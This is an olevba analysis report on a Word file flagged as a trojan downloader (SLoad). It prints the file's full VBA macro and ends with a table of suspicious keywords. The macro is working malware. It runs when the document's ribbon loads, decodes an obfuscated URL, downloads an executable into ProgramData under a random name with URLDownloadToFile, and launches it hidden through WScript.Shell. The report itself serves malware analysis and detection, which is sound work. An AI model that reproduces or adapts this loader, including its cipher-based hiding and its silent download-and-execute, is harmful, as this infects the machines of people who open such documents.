olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan-Downloader.MSOffice.SLoad.gen-baf23acf5e1b9e4bd094eac1e69d2971ad2259d407f6572e43598cfcdb5806d8
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: word/vbaProject.bin - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare PtrSafe Function URLDownloadToFile Lib "urlmon" _
    Alias "URLDownloadToFileA" (ByVal pCaller As Long, ByVal szURL As String, _
    ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long


'Dim MyRibbon As IRibbonUI
 
Sub MyOnloadProcedure(Ribbon As IRibbonUI)
    codetorun1
    'Set MyRibbon = Ribbon
End Sub
Sub codetorun1()
    Dim myname As String
    Dim myintegration As String
    Dim mypigPath As String
    Dim shell_obj
    Set shell_obj = CreateObject("WScript.Shell")
    myintegration = "iuuqt/..mjoz~mj.t.s8b4irxt~fzf"
    mypigPath = "D/*QsphsbnEbub*"
    mypigPath = OldText(mypigPath)
    myname = Now
    myname = Replace(myname, "/", "")
    myname = Replace(myname, " ", "")
    myname = Replace(myname, ":", "")
    myname = Left(myname, 12)
    Str1 = RandomString(3)
    str2 = RandomString(2)
    myname = Str1 & myname & str2 & ".e"
    myname = myname & "xe"
    myintegration2 = OldText(myintegration)
    ispig = URLDownloadToFile(0, myintegration2, mypigPath & myname, 0, 0)
    TotalAge = 10 'seconds
    For MyAge = 0 To TotalAge
        If isBabyBorn(mypigPath & myname) Then
            
            shell_obj.Run Chr(34) & mypigPath & "\" & myname & Chr(34), 0
            Exit For
        Else

            'Call Application.Wait(DateAdd("s", 1, Now))
        End If
    Next MyAge
End Sub

Function isBabyBorn(mypigPath As String) As Boolean
Dim ReturnString As String
    ReturnString = ""
    On Error Resume Next
    ReturnString = Dir(mypigPath)
    On Error GoTo 0
    If ReturnString = "" Then
        isBabyBorn = False
    Else
        isBabyBorn = True
    End If
End Function

Sub hi()
    Dim t As String
    t = NewText("abc")
    Dim strFile_Path As String
    strFile_Path = "D:\test.txt" 'Change as per your test folder path
    Open strFile_Path For Output As #1
    Write #1, t
    Close #1

End Sub
Function NewText(MyText As String) As String

Dim i As Integer
Dim Characters As String
Dim Ch As String
Dim NextCh As Integer


Characters = "ABCDEFGHIJKLMNOPQRSTUVWXZÅÄÖA01234567890"
Characters = Characters & LCase(Characters)
Characters = Characters & ":/.~\*"

For i = 1 To Len(MyText)
    Ch = Mid(MyText, i, 1)
    NextCh = InStr(Characters, Ch) + 1
    
    If NextCh > 1 Then
        Ch = Mid(Characters, NextCh, 1)
    End If
    NewText = NewText & Ch
Next i


End Function

Function OldText(MyText As String) As String

Dim i As Integer
Dim Characters As String
Dim Ch As String
Dim NextCh As Integer


Characters = "ABCDEFGHIJKLMNOPQRSTUVWXZÅÄÖA01234567890"
Characters = Characters & LCase(Characters)
Characters = Characters & ":/.~\*"

For i = 1 To Len(MyText)
    Ch = Mid(MyText, i, 1)
    NextCh = InStr(Characters, Ch) - 1
    
    If NextCh > 1 Then
        Ch = Mid(Characters, NextCh, 1)
    End If
    OldText = OldText & Ch
Next i


End Function

Function RandomString(Length As Integer) As String

Dim CharacterBank As Variant
Dim x As Long
Dim str As String

CharacterBank = Array("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", _
  "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", _
  "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", _
  "A", "B", "C", "D", "E", "F", "G", "H", _
  "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", _
  "W", "X", "Y", "Z")
  

'Randomly Select Characters One-by-One
  For x = 1 To Length
    Randomize
    str = str & CharacterBank(Int((UBound(CharacterBank) - LBound(CharacterBank) + 1) * Rnd + LBound(CharacterBank)))
  Next x

'Output Randomly Generated String
  RandomString = str

End Function






+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|URLDownloadToFileA  |May download files from the Internet         |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

